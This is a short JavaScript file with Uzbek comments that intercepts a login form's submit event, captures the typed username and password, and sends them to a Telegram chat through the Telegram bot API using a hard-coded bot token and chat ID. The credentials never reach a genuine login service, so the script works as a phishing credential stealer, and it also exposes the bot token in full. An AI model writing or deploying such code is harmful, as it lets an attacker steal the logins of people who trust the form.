document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();  // Formni yuborishni to'xtatadi

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // Telegram API URL
    const token = '7828795469:AAHdkMvW9jwE05JWSg7nhzCmueyoVJYZzWA';  // Telegram bot tokenini o'zgartiring
    const chatId = '-1002364480018';  // Guruhning chat ID sini o'zgartiring (manfiy)

    // Xabarni yaratish
    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;

    // Telegram API orqali xabar yuborish
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });

      const data = await response.json();
      if (response.ok) {
        console.log("Tayyor");
        
      } else {
        alert(`Xatolik yuz berdi: ${data.description}`);
      }
    } catch (error) {
      console.error("Error:", error);
      alert("Telegram serveri bilan ulanishda xato.");
    }
  });


// const token = '828795469:AAHdkMvW9jwE05JWSg7nhzCmueyoVJYZzWA';  // Telegram bot tokenini o'zgartiring
// const chatId = '-1002364480018';  // Guruhning chat ID sini o'zgartiring (manfiy)